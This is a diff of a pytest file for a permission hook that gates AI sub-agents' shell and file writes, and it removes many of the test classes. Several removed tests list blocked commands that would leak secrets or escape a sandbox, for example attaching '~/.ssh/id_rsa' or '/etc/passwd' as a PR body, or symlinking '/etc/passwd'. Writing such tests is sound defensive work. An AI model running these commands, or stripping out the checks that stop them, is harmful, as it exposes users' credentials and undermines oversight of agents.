-            "gitleaks detect --redact -r /tmp/x.json",
-            "gitleaks detect --redact -r=/tmp/x.json",
-            "gitleaks detect --redact -r/tmp/x.json",
-            "gitleaks detect --redact --report-path /tmp/x.json",
-            "git push origin feature/main-fix",
-        ],
-    )
-    def test_allowed(self, command: str) -> None:
-        assert decide(_b("pr-train-conductor", command), CFG).allow, command
-
-
-class TestRound4Breakage:
-    @pytest.mark.parametrize(
-        ("agent", "command"),
-        [
-            ("security-auditor", "git log -n5"),
-            ("security-auditor", "git log --grep=fix --no-merges --all"),
-            ("security-auditor", "git log -S needle --oneline"),
-            ("security-auditor", "git log -G pattern"),
-            ("security-auditor", "git log --author=brad"),
-            ("security-auditor", "git diff --word-diff --color=never"),
-            ("nist-specialist", "git log -n5 --all"),
-            ("charter-docs", "git diff --cached"),
-            ("charter-docs", "git log --oneline -3"),
-            ("charter-docs", "git status --porcelain"),
-            ("repo-coder", "CI=1 npm test"),
-        ],
-    )
-    def test_allowed(self, agent: str, command: str) -> None:
-        assert decide(_b(agent, command), CFG).allow, (agent, command)
-
-    @pytest.mark.parametrize(
-        ("agent", "command"),
-        [
-            ("repo-coder", "PATH=/tmp npm test"),
-            ("security-auditor", "GIT_CONFIG_PARAMETERS=x git log"),
-            ("security-auditor", "git log --output=x"),
-            ("security-auditor", "git diff --color=always"),
-            ("charter-docs", "git commit --amend -am x"),
-            ("charter-docs", "git commit -m x -S"),
-        ],
-    )
-    def test_blocked(self, agent: str, command: str) -> None:
-        assert not decide(_b(agent, command), CFG).allow, (agent, command)
-
-
 # Final whole-branch review fixes (I1, I3, I4, I7, m4).
 DATA = "/tmp/daedalus-test-data/daedalus-inline"
 
@@ -1447,230 +696,9 @@ class TestFinalRemotePlumbing:
         d = decide(_b(None, command), CFG)
         assert not d.allow and "Next:" in d.reason, command
 
-    @pytest.mark.parametrize(
-        "command",
-        [
-            "git send-pack origin HEAD:refs/heads/x",
-            "git http-push https://x/r.git HEAD",
-            "git fetch-pack origin",
-            "git upload-pack .",
-            "git receive-pack .",
-            "git credential-cache exit",
-        ],
-    )
-    def test_repo_coder_blocks(self, command: str) -> None:
-        assert not decide(_b("repo-coder", command), CFG).allow, command
-
     def test_commit_message_naming_plumbing_still_allowed(self) -> None:
         assert decide(_b(None, "git commit -m 'document send-pack and credential'"), CFG).allow
         assert decide(_b(None, "git commit -m 'credential fix' > /dev/null"), CFG).allow
-
-
-class TestFinalCoderGitAllowlist:
-    @pytest.mark.parametrize(
-        "command",
-        [
-            "git update-ref refs/heads/main HEAD",
-            "git branch -f main HEAD",
-            "git branch -D x",
-            "git branch -d x",
-            "git branch -m x",
-            "git symbolic-ref HEAD refs/heads/main",
-            "git reflog expire --all",
-            "git checkout main",
-            "git checkout -- docs/x.md",
-            "git restore docs/x.md",
-            "git restore -- ../other/a.py",
-            "git restore -- src/a.py",
-            "git checkout -- tests/test_a.py src/b.py",
-            "git checkout -- .claude/worktrees/u1/src/a.py src/b.py",
-            "git stash drop",
-            "git stash",
-            "git merge x",
-            "git config core.editor x",
-            "git worktree add ../x",
-        ],
-    )
-    def test_blocked(self, command: str) -> None:
-        d = decide(_b("repo-coder", command), CFG)
-        assert not d.allow and "Next:" in d.reason, command
-
-    @pytest.mark.parametrize(
-        "command",
-        [
-            "git stash list",
-            "git stash push -m wip",
-            "git stash pop",
-            "git restore -- .claude/worktrees/u1/src/a.py",
-            "git checkout -- .claude/worktrees/u1/tests/test_a.py .claude/worktrees/u1/src/b.py",
-            "git -C .claude/worktrees/u1 restore -- src/a.py",
-            "git branch",
-            "git branch --show-current",
-            "git worktree list",
-            "git status",
-            "git log --oneline -5",
-            "git show --stat",
-            "git rev-parse HEAD",
-            "git ls-files",
-            "git config --get user.name",
-        ],
-    )
-    def test_allowed(self, command: str) -> None:
-        assert decide(_b("repo-coder", command), CFG).allow, command
-
-
-class TestLiveRunGrammar:
-    @pytest.mark.parametrize(
-        "command",
-        [
-            "git status -sb",
-            "git status -bs",
-            "git status -s",
-            "git status -b",
-            "git status --short",
-            "git status --branch",
-            "git status --short --branch",
-            "git status -s -b src",
-            "git status --porcelain=v2 --show-stash",
-            "git status --porcelain=v1",
-        ],
-    )
-    def test_status_read_forms_allowed(self, command: str) -> None:
-        # F3b: read-only status flags, alone or bundled.
-        assert decide(_b("repo-coder", command), CFG).allow, command
-        assert decide(_b("pr-train-conductor", command), CFG).allow, command
-
-    @pytest.mark.parametrize(
-        "command",
-        [
-            "git status -sbx",
-            "git status -u",
-            "git status --porcelain=v3",
-            "git status --ignored",
-            "git status -sb && git commit --amend -m x",
-            "git status -sb && git branch -D x",
-            "git status -sb && git stash drop",
-        ],
-    )
-    def test_status_writes_and_unknown_flags_blocked(self, command: str) -> None:
-        d = decide(_b("repo-coder", command), CFG)
-        assert not d.allow and "Next:" in d.reason, command
-
-    @pytest.mark.parametrize(
-        "command",
-        ["python3 -m mypy src tests", "python3 -m mypy src/hello.py", "python -m mypy src"],
-    )
-    def test_mypy_with_paths_allowed(self, command: str) -> None:
-        # F3c: the test-runner rule admits mypy with path operands.
-        assert decide(_b("repo-coder", command), CFG).allow, command
-
-    @pytest.mark.parametrize(
-        "command",
-        [
-            "python3 -m mypy --cache-dir /tmp/x src",
-            "python3 -m mypy --config-file=x.ini src",
-            "python3 -m mypy -c 1",
-            "python3 -m mypyc src",
-            "python3 -c 'import mypy'",
-        ],
-    )
-    def test_mypy_flags_blocked(self, command: str) -> None:
-        assert not decide(_b("repo-coder", command), CFG).allow, command
-
-    @pytest.mark.parametrize(
-        "command",
-        [
-            "git status",
-            "git log --oneline -5",
-            "git diff --stat",
-            "git branch --show-current",
-            "git branch -a -v",
-            "git rev-parse --abbrev-ref HEAD",
-        ],
-    )
-    def test_conductor_read_commands_allowed(self, command: str) -> None:
-        # N9: the git reads agents/pr-train-conductor.md lists.
-        assert decide(_b("pr-train-conductor", command), CFG).allow, command
-
-    @pytest.mark.parametrize(
-        "command",
-        ["git remote -v", "git remote get-url origin", "git branch -vv", "git rev-parse @{u}"],
-    )
-    def test_conductor_remote_reads_blocked(self, command: str) -> None:
-        assert not decide(_b("pr-train-conductor", command), CFG).allow, command
-
-    def test_conductor_block_message_matches_its_git_grammar(self) -> None:
-        # N9: the message lists exactly CONDUCTOR_GIT.
-        d = decide(_b("pr-train-conductor", "git remote -v"), CFG)
-        assert d.reason is not None
-        listed = d.reason.split("limited to git ", 1)[1].split(",", 1)[0]
-        assert set(listed.split("/")) == CONDUCTOR_GIT
-
-    @pytest.mark.parametrize("command", ["python3 -m mypy @args.txt", "python3 -m mypy src @a"])
-    def test_mypy_argfile_blocked(self, command: str) -> None:
-        # M1: an @file operand smuggles flags past the path-only rule.
-        assert not decide(_b("repo-coder", command), CFG).allow, command
-
-
-class TestFinalCoderWriteTargets:
-    @pytest.mark.parametrize(
-        "command",
-        [
-            "cp src/a.py docs/project-requirements.md",
-            "sed -i s/a/b/ contracts/openapi.yaml",
-            "tee service-manifest.json",
-            "mv src/a.py /tmp/a.py",
-            "ln -s /etc/passwd src/p",
-            "install -m 644 src/a.py /usr/local/bin/a",
-            "truncate -s 0 service-manifest.json",
-            "dd of=contracts/x.yaml",
-            "rsync -a src/ ../other/",
-            "cp --target-directory=docs/x src/a.py",
-            "sed -i.bak -e s/a/b/ docs/x.md",
-            "cp src/../infra/a.tf src/a.tf",
-        ],
-    )
-    def test_blocked(self, command: str) -> None:
-        d = decide(_b("repo-coder", command), CFG)
-        assert not d.allow and d.reason.startswith("Bash write outside your unit worktree:"), (
-            command
-        )
-        assert "Next:" in d.reason
-
-    @pytest.mark.parametrize(
-        "command",
-        [
-            "cp .claude/worktrees/u1/src/a.py .claude/worktrees/u1/src/b.py",
-            "sed -i s/a/b/ .claude/worktrees/u1/src/a.py",
-            "tee .claude/worktrees/u1/tests/out.txt",
-            "mv .claude/worktrees/u1/src/a.py .claude/worktrees/u1/tests/a.py",
-            "install -m 644 .claude/worktrees/u1/src/a.py .claude/worktrees/u1/src/b.py",
-            "truncate -s 0 .claude/worktrees/u1/tests/out.txt",
-            "sed -n 1p docs/x.md",
-            "sed --in-place=.bak s/a/b/ .claude/worktrees/u1/src/a.py",
-        ],
-    )
-    def test_allowed(self, command: str) -> None:
-        assert decide(_b("repo-coder", command), CFG).allow, command
-
-    @pytest.mark.parametrize(
-        "command",
-        [
-            "cp src/a.py src/b.py",
-            "sed -i s/a/b/ src/a.py",
-            "tee tests/out.txt",
-            "mv .claude/worktrees/u1/src/a.py tests/a.py",
-            "install -m 644 src/a.py src/b.py",
-            "truncate -s 0 tests/out.txt",
-            "sed --in-place=.bak s/a/b/ src/a.py",
-        ],
-    )
-    def test_main_checkout_blocked(self, command: str) -> None:
-        # 0022: the same grammar aimed at the main checkout is refused.
-        d = decide(_b("repo-coder", command), CFG)
-        assert not d.allow and d.reason.startswith("Bash write outside your unit worktree:"), (
-            command
-        )
 
 
 class TestFinalDataDir:
@@ -1678,7 +706,7 @@ class TestFinalDataDir:
     def _env(self, monkeypatch: pytest.MonkeyPatch) -> None:
         monkeypatch.setenv("CLAUDE_PLUGIN_DATA", DATA)
 
-    @pytest.mark.parametrize("agent", [None, "repo-coder", "charter-docs", "contract-spec"])
+    @pytest.mark.parametrize("agent", [None])
     @pytest.mark.parametrize("tool", ["Write", "Edit", "MultiEdit"])
     def test_tool_writes_block_for_every_agent(self, agent: str | None, tool: str) -> None:
         d = decide(_w(agent, f"{DATA}/config.json", tool), CFG)
@@ -1735,7 +763,7 @@ class TestProjectDataDir:
     # 0010: <repo>/.claude/daedalus is written by hooks only and never committed.
     P = f"{CWD}/.claude/daedalus"
 
-    @pytest.mark.parametrize("agent", [None, "repo-coder", "charter-docs", "contract-spec"])
+    @pytest.mark.parametrize("agent", [None])
     @pytest.mark.parametrize("tool", ["Write", "Edit", "MultiEdit"])
     def test_tool_writes_block_for_every_agent(self, agent: str | None, tool: str) -> None:
         d = decide(_w(agent, f"{self.P}/config.json", tool), CFG)
@@ -1746,19 +774,6 @@ class TestProjectDataDir:
     )
     def test_relative_and_other_worktree_paths_block(self, path: str) -> None:
         assert not decide(_w(None, path), CFG).allow, path
-
-    def test_worktree_cwd_protects_main_repo_data_dir(self, repo_cwd: Path, tmp_path: Path) -> None:
-        git = ["git", "-C", str(repo_cwd), "-c", "user.name=t", "-c", "user.email=t@x.invalid"]
-        subprocess.run([*git, "commit", "-q", "--allow-empty", "-m", "i"], check=True)
-        wt = tmp_path.resolve() / "wt"
-        subprocess.run([*git, "worktree", "add", "-q", str(wt)], check=True)
-        payload = {
-            "tool_name": "Write",
-            "tool_input": {"file_path": f"{repo_cwd}/.claude/daedalus/config.json"},
-            "cwd": str(wt),
-            "agent_type": "repo-coder",
-        }
-        assert not decide(payload, CFG).allow
 
     def test_sibling_claude_dir_write_allowed_for_main(self) -> None:
         assert decide(_w(None, f"{CWD}/.claude/settings.local.json"), CFG).allow
@@ -1791,7 +806,7 @@ class TestProjectDataDir:
     def test_main_bash_reads_allowed(self, command: str) -> None:
         assert decide(_b(None, command), CFG).allow, command
 
-    @pytest.mark.parametrize("agent", [None, "repo-coder", "pr-train-conductor"])
+    @pytest.mark.parametrize("agent", [None])
     @pytest.mark.parametrize(
         "command",
         [
@@ -1831,8 +846,6 @@ class TestProjectDataDir:
     )
     def test_ordinary_git_add_commit_allowed(self, command: str) -> None:
         assert decide(_b(None, command), CFG).allow, command
-        # 0022: the coder runs the same command inside its unit worktree.
-        assert decide(_b("repo-coder", f"git -C {WT} {command[4:]}"), CFG).allow, command
 
     @pytest.mark.parametrize(
         "command",
@@ -1915,43 +928,6 @@ class TestProjectDataDir:
         assert decide(_b(None, command), CFG).allow, command
 
 
-class TestFinalConductorGh:
-    C = "pr-train-conductor"
-
-    @pytest.mark.parametrize(
-        "command",
-        [
-            "gh pr create --title x --body-file ~/.ssh/id_rsa",
-            "gh pr create --title x --body-file /etc/passwd",
-            "gh pr create -F ../secrets.md --title x",
-            "gh pr edit 3 --body-file=/var/x/notes.md",
-            "gh pr comment 3 --body-file -",
-            "gh pr create --title x --body-file docs/.tmp/../../x.md",
-            "gh -R o/r pr create --title x --body b",
-            "gh pr comment 3 --repo o/r --body b",
-            "gh pr edit 3 --repo=o/r --title t",
-        ],
-    )
-    def test_blocked(self, command: str) -> None:
-        d = decide(_b(self.C, command), CFG)
-        assert not d.allow and "Next:" in d.reason, command
-
-    def test_repo_flag_reason(self) -> None:
-        d = decide(_b(self.C, "gh -R o/r pr create --title x --body b"), CFG)
-        assert d.reason is not None and d.reason.startswith("the conductor works in the current")
-
-    @pytest.mark.parametrize(
-        "command",
-        [
-            "gh pr create --title x --body-file docs/.tmp/pr.md",
-            "gh pr create --title x -F /tmp/pr.md",
-            "gh -R o/r pr view 3",
-        ],
-    )
-    def test_allowed(self, command: str) -> None:
-        assert decide(_b(self.C, command), CFG).allow, command
-
-
 class TestFinalSubagentAsMain:
     def test_agent_id_without_type_blocks(self) -> None:
         payload = _b(None, "git status")
@@ -1994,306 +970,6 @@ _MANIFEST_LEDGER = {
 }
 
 
-class TestFixWaveLedgerResolution:
-    @pytest.mark.parametrize("tool", ["Write", "Edit"])
-    def test_manifest_ledger_blocked(self, tmp_path: Path, tool: str) -> None:
-        repo = _git_init(tmp_path / "repo")
-        manifest = {"ledger": _MANIFEST_LEDGER}
-        (repo / "service-manifest.json").write_text(json.dumps(manifest))
-        d = decide(_wr(repo, repo / "docs" / "adr.md", tool), Config())
-        assert not d.allow and d.reason is not None and "append_ledger.py" in d.reason
-        assert decide(_wr(repo, repo / "docs" / "notes.md", tool), Config()).allow
-
-    @pytest.mark.parametrize("tool", ["Write", "Edit"])
-    def test_probed_ledger_blocked(self, tmp_path: Path, tool: str) -> None:
-        repo = _git_init(tmp_path / "repo")
-        (repo / "docs").mkdir()
-        (repo / "docs" / "decisions.md").write_text("| Id | Date |\n|---|---|\n")
-        d = decide(_wr(repo, repo / "docs" / "decisions.md", tool), Config())
-        assert not d.allow and d.reason is not None and "append_ledger.py" in d.reason
-
-    def test_default_ledger_protected_beside_a_declared_one(self, tmp_path: Path) -> None:
-        repo = _git_init(tmp_path / "repo")
-        (repo / "docs").mkdir()
-        (repo / "docs" / "decisions.md").write_text("| Id | Date |\n|---|---|\n")
-        cfg = Config(ledger=LedgerDecl(repo / "LEDGER.md", "heading-entry", "{seq}", "last-row-id"))
-        assert not decide(_wr(repo, repo / "docs" / "decisions.md"), cfg).allow
-        assert not decide(_wr(repo, repo / "LEDGER.md"), cfg).allow
-
-    def test_config_ledger_still_blocked(self, tmp_path: Path) -> None:
-        repo = _git_init(tmp_path / "repo")
-        decl = LedgerDecl(repo / "docs" / "log.md", "markdown-table-row", "{seq}", "last-row-id")
-        assert not decide(_wr(repo, repo / "docs" / "log.md"), Config(ledger=decl)).allow
-
-    def test_no_ledger_nothing_protected(self, tmp_path: Path) -> None:
-        repo = _git_init(tmp_path / "repo")
-        assert decide(_wr(repo, repo / "docs" / "decisions.md"), Config()).allow
-
-    @staticmethod
-    def _probed(tmp_path: Path) -> Path:
-        repo = _git_init(tmp_path / "repo")
-        (repo / "docs" / ".tmp").mkdir(parents=True)
-        (repo / "docs" / "decisions.md").write_text("| Id | Date |\n|---|---|\n")
-        return repo
-
-    def test_case_variant_spelling_blocked(self, tmp_path: Path) -> None:
-        # FW-I1: casefold branch; Decisions.md does not exist as a separate file.
-        repo = self._probed(tmp_path)
-        target = repo / "docs" / "Decisions.md"
-        if not target.exists():
-            assert not decide(_wr(repo, target), Config()).allow
-        else:
-            assert os.path.samefile(target, repo / "docs" / "decisions.md")
-            assert not decide(_wr(repo, target, "Edit"), Config()).allow
-
-    def test_hardlink_to_ledger_blocked(self, tmp_path: Path) -> None:
-        # FW-I1: samefile branch; an existing name that is the ledger's inode.
-        repo = self._probed(tmp_path)
-        alias = repo / "docs" / "alias.md"
-        os.link(repo / "docs" / "decisions.md", alias)
-        assert not decide(_wr(repo, alias, "Edit"), Config()).allow
-
-    def test_symlink_to_ledger_blocked(self, tmp_path: Path) -> None:
-        repo = self._probed(tmp_path)
-        link = repo / "docs" / "link.md"
-        link.symlink_to(repo / "docs" / "decisions.md")
-        assert not decide(_wr(repo, link), Config()).allow
-
-    def test_dotdot_path_to_ledger_blocked(self, tmp_path: Path) -> None:
-        repo = self._probed(tmp_path)
-        d = decide(_wr(repo, Path(f"{repo}/docs/.tmp/../decisions.md")), Config())
-        assert not d.allow
-
-    def test_other_doc_allowed_beside_ledger(self, tmp_path: Path) -> None:
-        repo = self._probed(tmp_path)
-        assert decide(_wr(repo, repo / "docs" / "other.md"), Config()).allow
-        (repo / "docs" / "other.md").write_text("x")
-        assert decide(_wr(repo, repo / "docs" / "other.md", "Edit"), Config()).allow
-
-    def test_malformed_manifest_fails_closed_with_next(self, tmp_path: Path) -> None:
-        repo = _git_init(tmp_path / "repo")
-        (repo / "service-manifest.json").write_text("{not json")
-        d = decide(_wr(repo, repo / "docs" / "notes.md"), Config())
-        assert not d.allow and d.reason is not None
-        assert "fail closed" in d.reason and "Next: fix the manifest syntax." in d.reason
-
-    def test_append_ledger_cli_still_allowed(self, tmp_path: Path) -> None:
-        repo = _git_init(tmp_path / "repo")
-        (repo / "service-manifest.json").write_text(json.dumps({"ledger": _MANIFEST_LEDGER}))
-        args = "--expected-seq 1 --entry-file docs/.tmp/e.md --repo BO --type PLT"
-        payload = _b("charter-docs", f"python3 {REPO_ROOT}/scripts/append_ledger.py {args}")
-        payload["cwd"] = str(repo)
-        assert decide(payload, Config()).allow
-
-
-class TestFixWaveConductorGh:
-    C = "pr-train-conductor"
-
-    @pytest.mark.parametrize(
-        "command",
-        [
-            "gh pr create --title x --body b",
-            "gh pr create --title x -b b",
-            "gh pr create --title x --body=b",
-            "gh pr create --title x -bb",
-            "gh pr create --title x -db b",
-            "gh pr create --title x --body-file docs/.tmp/pr.md --body b",
-            "gh pr create --title x --body-file docs/.tmp/pr.md --body=b",
-            "gh pr create --title x --body-file docs/.tmp/pr.md -bb",
-            "gh pr create --title x",
-        ],
-    )
-    def test_inline_body_blocked(self, command: str) -> None:
-        d = decide(_b(self.C, command), CFG)
-        assert not d.allow and d.reason is not None, command
-        assert d.reason.startswith("gh pr create/edit/comment take the body only"), d.reason
-        assert "Next: write the body to docs/.tmp/ and pass --body-file" in d.reason
-
-    @pytest.mark.parametrize(
-        "command",
-        [
-            "gh pr create --base main --head daedalus/T --title x --body-file docs/.tmp/pr.md",
-            "gh pr create --title x -F /tmp/pr.md",
-            "gh pr create --title x --body-file=/tmp/pr.md",
-            "gh pr view daedalus/T --json url",
-        ],
-    )
-    def test_allowed(self, command: str) -> None:
-        assert decide(_b(self.C, command), CFG).allow, command
-
-    @pytest.mark.parametrize(
-        "command",
-        [
-            "gh pr edit 3 --body-file docs/.tmp/pr.md -db b",
-            "gh pr edit 3 --title t",
-            "gh pr comment 3 --body b",
-            "gh pr comment 3 -b b",
-            "gh pr comment 3 --body=b",
-            "gh pr comment 3",
-            "gh pr edit daedalus/T --base dev --body-file docs/.tmp/pr.md",
-            "gh pr edit daedalus/T --base=dev --body-file docs/.tmp/pr.md",
-            "gh pr edit daedalus/T -B dev --body-file docs/.tmp/pr.md",
-            "gh pr edit daedalus/T -Bdev --body-file docs/.tmp/pr.md",
-            "gh pr comment 3 --body-file docs/.tmp/c.md",
-            "gh pr comment 3 -F/tmp/c.md",
-            "gh pr diff 3",
-        ],
-    )
-    def test_edit_comment_diff_refused_by_0028(self, command: str) -> None:
-        # K1, 0028: comment, diff and any pr edit beyond the body are off the 0028 list.
-        d = decide(_b(self.C, command), CFG)
-        assert not d.allow and "is a default-deny command" in str(d.reason), command
-
-    @pytest.mark.parametrize(
-        "command",
-        [
-            "gh pr edit daedalus/T --body-file docs/.tmp/pr.md",
-            "gh pr edit daedalus/T -F/tmp/Build-body.md",
-            "gh pr edit 3 --body-file /tmp/pr.md",
-        ],
-    )
-    def test_pr_edit_body_file_allowed(self, command: str) -> None:
-        # K1: the conductor may replace its PR body from a file.
-        d = decide(_b(self.C, command), CFG)
-        assert d.allow, (command, d.reason)
-
-    @pytest.mark.parametrize(
-        "command", ["gh pr edit 3 --body b", "gh pr edit 3 -b b", "gh pr edit 3 --body=b"]
-    )
-    def test_pr_edit_inline_body_refused(self, command: str) -> None:
-        # K1: the body comes only from --body-file.
-        d = decide(_b(self.C, command), CFG)
-        assert not d.allow and "only from --body-file" in str(d.reason), command
-
-
-class TestFixWaveGitleaksRedact:
-    C = "pr-train-conductor"
-
-    @pytest.mark.parametrize(
-        "command",
-        [
-            'gitleaks detect --log-opts="abc..daedalus/T"',
-            "gitleaks detect",
-            "gitleaks detect --redact=50 --log-opts=abc..daedalus/T",
-            "gitleaks detect --redact=0",
-            "gitleaks detect --log-opts --redact",
-        ],
-    )
-    def test_unredacted_blocked(self, command: str) -> None:
-        d = decide(_b(self.C, command), CFG)
-        assert not d.allow and d.reason is not None, command
-        assert "Next: rerun it as gitleaks detect --redact" in d.reason
-
-    @pytest.mark.parametrize(
-        "command",
-        [
-            'gitleaks detect --redact --log-opts="abc..daedalus/T"',
-            "gitleaks detect --log-opts=abc..daedalus/T --redact",
-            "gitleaks detect --redact=100 --log-opts=abc..daedalus/T",
-        ],
-    )
-    def test_redacted_allowed(self, command: str) -> None:
-        assert decide(_b(self.C, command), CFG).allow, command
-
-
-class TestFixWaveCharterDocsBash:
-    @pytest.mark.parametrize(
-        "command",
-        [
-            "git merge --no-ff x",
-            "git merge --no-ff -m x b",
-            "git -C /work/Charter add -A",
-            "git add -A",
-            "git add --all",
-            "git add -u",
-            "git add .",
-            "git add ./",
-            "git add docs/",
-            "git add -- .",
-            "git add docs/.",
-            "git add :/",
-            "git add -f docs/a.md",
-            "git add",
-            "git commit -am x",
-            "git commit -F docs/.tmp/msg.txt",
-            "git commit -m x -- docs/a.md",
-            "git commit -q -m x",
-            "git worktree list",
-            "git branch",
-            "git rev-parse HEAD",
-            "mkdir -p docs/.tmp",
-            "cat docs/a.md",
-            "ls docs",
-            "sha256sum x",
-        ],
-    )
-    def test_blocked(self, command: str) -> None:
-        d = decide(_b("charter-docs", command), CFG)
-        assert not d.allow and d.reason is not None, command
-        assert "Next:" in d.reason
-
-    def test_reason_names_the_grammar(self) -> None:
-        d = decide(_b("charter-docs", "git merge --no-ff x"), CFG)
-        assert d.reason is not None and d.reason.startswith(
-            "charter-docs Bash is limited to append_ledger.py, git add <path>, git commit -m,"
-        )
-
-    @pytest.mark.parametrize(
-        "command",
-        [
-            "git add docs/decisions.md",
-            "git add -- docs/a.md docs/b.md",
-            "git commit -m x",
-            "git status",
-            "git log --oneline -3",
-            "git diff --cached",
-            "git -C /work/Charter add decision-log.md",
-            "git -C /work/Charter commit -m x",
-            "git -C /work/Charter status --porcelain",
-            "git -C /work/Charter log -n 1",
-            "git -C /work/Charter diff --stat",
-        ],
-    )
-    def test_allowed(self, command: str) -> None:
-        assert decide(_b("charter-docs", command), CFG).allow, command
-
-
-def test_coder_writes_inside_a_unit_worktree() -> None:
-    # 0022: the coder's cwd is the main checkout; its code dirs live in the unit worktree.
-    assert decide(_w("repo-coder", f"{WT}/src/a.py"), CFG).allow
-    assert decide(_w("repo-coder", f"{WT}/tests/test_a.py", "Edit"), CFG).allow
-    assert decide(_b("repo-coder", f"cp {WT}/src/a.py {WT}/src/b.py"), CFG).allow
-
-
-@pytest.mark.parametrize(
-    "path",
-    [
-        f"{CWD}/.claude/worktrees/src/a.py",
-        f"{CWD}/.claude/worktrees/x/../../daedalus/src/a.py",
-        "/other/repo/.claude/worktrees/u1/src/a.py",
-    ],
-)
-def test_coder_write_outside_a_unit_worktree_is_refused(path: str) -> None:
-    d = decide(_w("repo-coder", path), CFG)
-    assert not d.allow and "Next:" in str(d.reason), path
-
-
-def test_coder_write_outside_reason() -> None:
-    d = decide(_w("repo-coder", f"{CWD}/infra/a.tf"), CFG)
-    want = f"write outside your unit worktree: {CWD}/infra/a.tf. Next: ask the orchestrating"
-    assert not d.allow and str(d.reason).startswith(want)
-
-
-@pytest.mark.parametrize(
-    "rel", ["scripts/x.py", "scripts/lib/y.py", "infra/a.tf", "README.md", "docs/x.md"]
-)
-def test_coder_writes_anywhere_unprotected_in_its_worktree(rel: str) -> None:
-    # 0054: the boundary is the unit worktree minus protected paths.
-    assert decide(_w("repo-coder", f"{WT}/{rel}"), CFG).allow, rel
-    assert decide(_w("repo-coder", f"{WT}/{rel}", "Edit"), CFG).allow, rel
-    assert decide(_b("repo-coder", f"tee {WT}/{rel}"), CFG).allow, rel
-
-
 BUILTIN_REL = [
     "contracts/openapi.yaml",
     "contracts/events/x.schema.json",
@@ -2309,77 +985,10 @@ BUILTIN_REL = [
 ]
 
 
-@pytest.mark.parametrize("rel", BUILTIN_REL)
-def test_coder_builtin_protected_paths_are_refused(rel: str) -> None:
-    target = f"{WT}/{rel}"
-    want = f"protected path (built in): {target}. Next: ask the orchestrating session"
-    for payload in (_w("repo-coder", target), _w("repo-coder", target, "Edit")):
-        d = decide(payload, CFG)
-        assert not d.allow and str(d.reason).startswith(want), (rel, d.reason)
-        assert "contract-spec or charter-docs" in str(d.reason)
-    d = decide(_b("repo-coder", f"tee {target}"), CFG)
-    assert not d.allow and str(d.reason).startswith(want), (rel, d.reason)
-
-
-@pytest.mark.parametrize(
-    "command",
-    [
-        f"cp {WT}/src/a.py {WT}/contracts/openapi.yaml",
-        f"sed -i s/a/b/ {WT}/.github/workflows/ci.yml",
-        f"rm -r {WT}/.github",
-        f"cp {WT}/src/a {WT}/.github/CODEOWNERS",
-        f"mv {WT}/contracts {WT}/c2",
-        f"truncate -s 0 {WT}/service-manifest.json",
-        f"tee {WT}/.git",
-        f"git -C {WT} restore -- contracts/openapi.yaml",
-        f"git restore -- {WT}/.claude/settings.json",
-    ],
-)
-def test_coder_bash_writes_to_builtin_protected_paths_are_refused(command: str) -> None:
-    d = decide(_b("repo-coder", command), CFG)
-    assert not d.allow and str(d.reason).startswith("protected path (built in):"), command
-
-
-def test_coder_repo_local_ledger_in_worktree_is_refused() -> None:
-    # 0054: the ledger begin resolves, mapped into the worktree, is a built-in protected path.
-    decl = LedgerDecl(Path("docs/decisions.md"), "markdown-table-row", "{seq:04d}", "last-row-id")
-    cfg = Config(ledger=decl)
-    target = f"{WT}/docs/decisions.md"
-    d = decide(_w("repo-coder", target), cfg)
-    assert not d.allow and str(d.reason).startswith(f"protected path (built in): {target}.")
-    d = decide(_b("repo-coder", f"rm -r {WT}/docs"), cfg)
-    assert not d.allow and str(d.reason).startswith("protected path (built in):")
-    assert decide(_w("repo-coder", f"{WT}/docs/other.md"), cfg).allow
-    # 0054: a ledger outside the repo has no worktree copy to protect.
-    assert decide(_w("repo-coder", f"{WT}/docs/decisions.md"), CFG).allow
-
-
 def test_main_never_writes_unit_worktree_code() -> None:
     d = decide(_w(None, f"{WT}/src/a.py"), CFG)
     reason = "the orchestrating session does not write application code during a train"
     assert not d.allow and reason in str(d.reason)
-
-
-def test_coder_restores_paths_inside_its_unit_worktree() -> None:
-    assert decide(_b("repo-coder", f"git restore -- {WT}/src/a.py"), CFG).allow
-
-
-def test_coder_cannot_write_the_main_checkout() -> None:
-    # 0022: coders own a unit worktree; the main checkout is never their write target.
-    assert not decide(_w("repo-coder", f"{CWD}/src/a.py"), CFG).allow
-    assert not decide(_w("repo-coder", f"{CWD}/tests/test_a.py", "Edit"), CFG).allow
-    assert not decide(_b("repo-coder", f"cp a {CWD}/src/b.py"), CFG).allow
-    assert not decide(_b("repo-coder", f"git restore -- {CWD}/src/a.py"), CFG).allow
-
-
-def test_coder_pathspec_resolves_against_git_dash_c() -> None:
-    # 0022: a relative pathspec names a path under the -C directory, else under cwd.
-    assert decide(_b("repo-coder", f"git -C {WT} restore -- src/a.py"), CFG).allow
-    assert decide(_b("repo-coder", f"git -C {WT} checkout -- tests/test_a.py"), CFG).allow
-    assert not decide(_b("repo-coder", f"git -C {CWD} restore -- src/a.py"), CFG).allow
-    assert not decide(_b("repo-coder", f"git -C {WT} restore -- ../../../src/a.py"), CFG).allow
-    assert decide(_b("repo-coder", f"git -C {WT} restore -- README.md"), CFG).allow
-    assert decide(_b("repo-coder", f"git restore -- {WT}/src/a.py"), CFG).allow
 
 
 def _unit_repo(path: Path) -> tuple[Path, Path]:
@@ -2404,145 +1013,6 @@ def _cwd(payload: dict[str, Any], cwd: Path) -> dict[str, Any]:
     return payload
 
 
-def test_coder_unit_worktree_through_a_symlinked_root(tmp_path: Path) -> None:
-    # 0022: a symlinked path to the repo and the real path resolve to one worktree base.
-    repo, _ = _unit_repo(tmp_path / "real")
-    link = tmp_path / "link"
-    link.symlink_to(repo)
-    for cwd, root in ((link, repo), (repo, link), (link, link)):
-        payload = _w("repo-coder", f"{root}/.claude/worktrees/u1/src/a.py")
-        payload["cwd"] = str(cwd)
-        payload["session_id"] = "s"
-        assert decide(payload, CFG).allow, (cwd, root)
-        payload = _w("repo-coder", f"{root}/src/a.py")
-        payload["cwd"] = str(cwd)
-        assert not decide(payload, CFG).allow, (cwd, root)
-
-
-@pytest.mark.parametrize(
-    "command",
-    [
-        f"git -C {WT}/src restore -- :/README.md",
-        f"git -C {WT}/src checkout -- :/",
-        f"git -C {WT}/src restore -- ':(top)src/a.py'",
-        f"git -C {WT} restore -- ':!src/a.py'",
-        f"git -C {WT} add :/",
-        f"git -C {WT} commit -m x -- :/",
-    ],
-)
-def test_coder_pathspec_magic_is_refused(command: str) -> None:
-    # 0022: :/ and :(top) are worktree-top relative; the jail cannot resolve them lexically.
-    assert not decide(_b("repo-coder", command), CFG).allow, command
-
-
-@pytest.mark.parametrize("agent", ["repo-coder", "contract-spec", "charter-docs"])
